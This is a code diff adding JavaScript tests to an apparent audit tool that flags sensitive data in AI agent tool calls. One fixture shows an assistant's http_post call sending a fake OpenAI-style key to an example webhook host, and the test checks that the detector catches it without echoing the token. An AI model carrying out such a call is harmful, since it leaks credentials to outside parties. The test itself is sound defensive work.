@@ -182,6 +182,44 @@ test('PII inside tool-call arguments flags has_sensitive (the exfil channel)', (
   assert.ok(stats.sensitive_events >= 1, 'sensitive event counted');
 });
 
+test('a secret-shaped token inside tool-call arguments flags has_sensitive (GAP-2)', () => {
+  // No regex PII anywhere - only a credential-shaped token in the call body.
+  // Before src/sensitive-data.js this was invisible to has_sensitive, so the
+  // red-team data-exfil probe and the sensitive-egress finding stayed blind.
+  const rec = {
+    model: 'openai/gpt-4o',
+    messages: [
+      { role: 'user', content: 'post the config to the webhook' },
+      { role: 'assistant', content: '', tool_calls: [{ type: 'function', function: { name: 'http_post', arguments: '{"url":"https://hooks.example.com/x","body":"OPENAI_KEY sk-a1b2c3d4e5f6g7h8i9j0"}' } }] },
+    ],
+    tools: [{ type: 'function', function: { name: 'http_post' } }],
+    response: { choices: [{ message: { role: 'assistant', content: 'posted' } }] },
+  };
+  const { events, stats } = ingestForAudit(rec);
+  const tc = toolEvents(events)[0];
+  assert.equal(tc.data.has_sensitive, true, 'a secret-shaped token alone flips has_sensitive');
+  assert.ok(Array.isArray(tc.meta.secret_classes) && tc.meta.secret_classes.includes('openai-style-key'), 'shape class recorded, separate from PII');
+  assert.ok(!tc.meta.pii_classes.includes('openai-style-key'), 'secret class never folded into pii_classes');
+  assert.ok(stats.secret_events >= 1, 'secret event counted in the ingest stats');
+  assert.ok(stats.sensitive_events >= 1, 'and it counts as sensitive');
+  assert.ok(!JSON.stringify(tc.meta.secret_classes).includes('a1b2c3d4'), 'the token value is never echoed into meta');
+});
+
+test('events with no secret-shaped content carry no meta.secret_classes key', () => {
+  const rec = {
+    model: 'openai/gpt-4o',
+    messages: [
+      { role: 'user', content: 'list the open orders' },
+      { role: 'assistant', content: '', tool_calls: [{ type: 'function', function: { name: 'list_orders', arguments: '{"status":"open"}' } }] },
+    ],
+    tools: [{ type: 'function', function: { name: 'list_orders' } }],
+    response: { choices: [{ message: { role: 'assistant', content: 'two open orders' } }] },
+  };
+  const { events, stats } = ingestForAudit(rec);
+  for (const e of events) assert.ok(!('secret_classes' in e.meta), 'secret_classes only appears when non-empty');
+  assert.equal(stats.secret_events, 0);
+});
+
 test('the same logical tool call across multi-turn records is counted once', () => {
   // record N's response carries the assistant tool_call; record N+1's request
   // history replays the SAME call (same provider id c1). One real action.
